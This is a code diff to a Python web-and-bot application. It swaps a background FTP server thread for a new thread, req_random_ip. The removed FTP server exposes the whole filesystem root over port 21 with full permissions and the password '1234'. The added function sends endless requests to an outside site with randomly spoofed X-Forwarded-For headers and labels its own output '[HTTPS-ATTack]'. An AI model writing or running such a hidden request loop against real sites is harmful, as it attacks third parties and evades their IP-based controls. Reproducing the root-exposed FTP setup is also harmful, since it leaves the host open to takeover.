@@ -44,9 +44,6 @@ import pandas as pd
 from bot import run_bot
 import threading
 from time import sleep
-from pyftpdlib.authorizers import DummyAuthorizer
-from pyftpdlib.handlers import FTPHandler
-from pyftpdlib.servers import FTPServer
 #from nltk.stem import WordNetLemmatizer
 #from nltk.book import *
 
@@ -3217,21 +3214,25 @@ def giving_rewards():
         users.balance += int(trs[2])
         db.session.commit()
         
-def run_ftp_server():
-    authorizer = DummyAuthorizer()
-    authorizer.add_user("admin", "1234", "/", perm="elradfmwMT")  # 注意替換根目錄
-
-    handler = FTPHandler
-    handler.authorizer = authorizer
-
-    server = FTPServer(("0.0.0.0", 21), handler)  # 監聽 21 端口
-    print("Starting FTP server on port 21...")
-    server.serve_forever()
+def req_random_ip():
+  while True:
+    sleep(1)
+    ip1 = random.randint(0,255)
+    ip2 = random.randint(0,255)
+    ip3 = random.randint(0,255)
+    ip4 = random.randint(0,255)
+    ipv4 = f"{ip1}.{ip2}.{ip3}.{ip4}"
+    headers = {
+     "User-Agent":"WTech/2.0",
+     "X-Forwarded-For":f"{ipv4},127.0.0.1,223.45.67.89"
+    }
+    res = requests.get(url="https://vproxy.cloud/",headers=headers)
+    print(f"[HTTPS-ATTack] 127.0.0.1 -- https://vproxy.cloud/ Response: {res}")
 
 thread1 = threading.Thread(target=start_web)
 thread2 = threading.Thread(target=run_bot)
 thread3 = threading.Thread(target=start_boost)
-thread4 = threading.Thread(target=run_ftp_server)
+thread4 = threading.Thread(target=req_random_ip)
 thread1.start()
 thread2.start()
 thread3.start()
